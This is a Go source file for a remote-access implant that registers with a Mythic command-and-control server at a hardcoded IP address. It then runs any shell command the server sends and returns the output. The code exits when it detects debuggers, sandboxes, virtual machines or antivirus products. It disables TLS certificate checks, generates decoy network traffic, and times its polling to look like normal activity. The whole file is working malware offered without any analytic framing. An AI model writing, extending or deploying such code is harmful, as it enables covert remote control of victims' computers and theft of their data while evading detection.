package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

const (
	mythicURL = "https://37.27.249.191:7443"
	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
)

type CheckinPayload struct {
	Action       string                 `json:"action"`
	IP           string                 `json:"ip"`
	OS           string                 `json:"os"`
	User         string                 `json:"user"`
	Host         string                 `json:"host"`
	PID          int                    `json:"pid"`
	UUID         string                 `json:"uuid"`
	Architecture string                 `json:"architecture"`
	Domain       string                 `json:"domain"`
	Extra        map[string]interface{} `json:"extra"`
}

type TaskResponse struct {
	UUID     string `json:"uuid"`
	TaskID   string `json:"task_id"`
	Response string `json:"response"`
	Status   string `json:"status"`
}

func DetectHostileEnvironment() bool {
	hostileProcesses := []string{
		"ollydbg", "x64dbg", "windbg", "ida", "ida64", "wireshark", "tcpview",
		"regmon", "filemon", "procmon", "vmware", "virtualbox", "vbox", "qemu",
		"sandboxie", "cuckoo", "anubis", "threat", "joebox", "comodo", "sunbelt",
		"avp", "avast", "kaspersky", "norton", "mcafee", "malwarebytes", "defender",
	}
	
	for _, proc := range hostileProcesses {
		cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s.exe", proc))
		if output, err := cmd.Output(); err == nil {
			if strings.Contains(strings.ToLower(string(output)), proc) {
				return true
			}
		}
	}
	
	cmd := exec.Command("wmic", "computersystem", "get", "manufacturer")
	if output, err := cmd.Output(); err == nil {
		manufacturer := strings.ToLower(string(output))
		vmStrings := []string{"vmware", "virtualbox", "vbox", "qemu", "xen", "parallels", "microsoft corporation", "innotek"}
		for _, vm := range vmStrings {
			if strings.Contains(manufacturer, vm) {
				return true
			}
		}
	}
	
	if runtime.NumCPU() < 2 {
		return true
	}
	
	return false
}

func createHTTPClient() *http.Client {
	return &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				ServerName:         "",
			},
		},
		Timeout: 30 * time.Second,
	}
}

func RegisterWithMythic() error {
	hostname, _ := os.Hostname()
	uuid := fmt.Sprintf("phantom-%d-%s", time.Now().Unix(), hostname)
	
	endpoints := []string{
		"/api/v1.4/agent_message",
		"/agent_message", 
		"/api/v1.3/agent_message",
		"/new/callback",
		"/callback",
		"/",
	}
	
	payload := CheckinPayload{
		Action:       "checkin",
		IP:           "127.0.0.1",
		OS:           runtime.GOOS,
		User:         os.Getenv("USERNAME"),
		Host:         hostname,
		PID:          os.Getpid(),
		UUID:         uuid,
		Architecture: runtime.GOARCH,
		Domain:       "",
		Extra: map[string]interface{}{
			"process_name": "explorer.exe",
			"integrity":    "medium",
		},
	}
	
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return err
	}
	
	client := createHTTPClient()
	
	for _, endpoint := range endpoints {
		req, err := http.NewRequest("POST", mythicURL+endpoint, bytes.NewBuffer(jsonData))
		if err != nil {
			continue
		}
		
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", userAgent)
		req.Header.Set("Accept", "*/*")
		req.Header.Set("Connection", "keep-alive")
		
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		
		if resp.StatusCode < 500 {
			resp.Body.Close()
			return nil
		}
		resp.Body.Close()
	}
	
	return fmt.Errorf("all endpoints failed")
}

func GetMythicTasks() (string, error) {
	hostname, _ := os.Hostname()
	uuid := fmt.Sprintf("phantom-%d-%s", time.Now().Unix(), hostname)
	
	endpoints := []string{
		"/api/v1.4/agent_message",
		"/agent_message",
		"/api/v1.3/agent_message", 
		"/new/callback",
		"/callback",
		"/",
	}
	
	client := createHTTPClient()
	
	for _, endpoint := range endpoints {
		req, err := http.NewRequest("GET", mythicURL+endpoint+"?uuid="+uuid, nil)
		if err != nil {
			continue
		}
		
		req.Header.Set("User-Agent", userAgent)
		req.Header.Set("Accept", "*/*")
		
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		
		if resp.StatusCode == 200 {
			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err == nil && len(body) > 0 {
				bodyStr := string(body)
				if !strings.Contains(bodyStr, "<html>") && 
				   !strings.Contains(bodyStr, "<!doctype") &&
				   len(bodyStr) > 5 {
					if decoded, err := base64.StdEncoding.DecodeString(bodyStr); err == nil {
						return string(decoded), nil
					}
					return bodyStr, nil
				}
			}
		} else {
			resp.Body.Close()
		}
	}
	
	return "", nil
}

func ExecuteCommand(command string) string {
	var cmd *exec.Cmd
	
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	
	output, err := cmd.Output()
	if err != nil {
		return fmt.Sprintf("Error: %s", err.Error())
	}
	
	return string(output)
}

func SendMythicResponse(taskID, output string) error {
	hostname, _ := os.Hostname()
	uuid := fmt.Sprintf("phantom-%d-%s", time.Now().Unix(), hostname)
	
	response := TaskResponse{
		UUID:     uuid,
		TaskID:   taskID,
		Response: base64.StdEncoding.EncodeToString([]byte(output)),
		Status:   "completed",
	}
	
	jsonData, err := json.Marshal(response)
	if err != nil {
		return err
	}
	
	endpoints := []string{
		"/api/v1.4/agent_message",
		"/agent_message",
		"/api/v1.3/agent_message",
		"/new/callback", 
		"/callback",
		"/",
	}
	
	client := createHTTPClient()
	
	for _, endpoint := range endpoints {
		req, err := http.NewRequest("POST", mythicURL+endpoint, bytes.NewBuffer(jsonData))
		if err != nil {
			continue
		}
		
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", userAgent)
		req.Header.Set("Accept", "*/*")
		
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		
		if resp.StatusCode < 500 {
			resp.Body.Close()
			return nil
		}
		resp.Body.Close()
	}
	
	return fmt.Errorf("failed to send response")
}

func MaintainLegitimacy() {
	go func() {
		rand.Seed(time.Now().UnixNano())
		
		for {
			sleepTime := time.Duration(300+rand.Intn(600)) * time.Second
			time.Sleep(sleepTime)
			
			activities := []func(){
				func() {
					cmd := exec.Command("nslookup", "microsoft.com")
					cmd.Run()
				},
				func() {
					cmd := exec.Command("ping", "-n", "1", "8.8.8.8")
					cmd.Run()
				},
			}
			
			if len(activities) > 0 {
				activities[rand.Intn(len(activities))]()
			}
		}
	}()
}

func main() {
	if DetectHostileEnvironment() {
		os.Exit(0)
	}
	
	MaintainLegitimacy()
	
	time.Sleep(time.Duration(30+rand.Intn(60)) * time.Second)
	
	err := RegisterWithMythic()
	if err != nil {
		time.Sleep(time.Duration(60+rand.Intn(120)) * time.Second)
	}
	
	rand.Seed(time.Now().UnixNano())
	
	for {
		command, err := GetMythicTasks()
		if err == nil && command != "" {
			output := ExecuteCommand(command)
			SendMythicResponse("task-"+fmt.Sprintf("%d", time.Now().Unix()), output)
		}
		
		now := time.Now()
		var jitter time.Duration
		
		if now.Hour() >= 9 && now.Hour() <= 17 {
			jitter = time.Duration(5+rand.Intn(10)) * time.Second
		} else {
			jitter = time.Duration(15+rand.Intn(30)) * time.Second
		}
		
		time.Sleep(jitter)
	}
}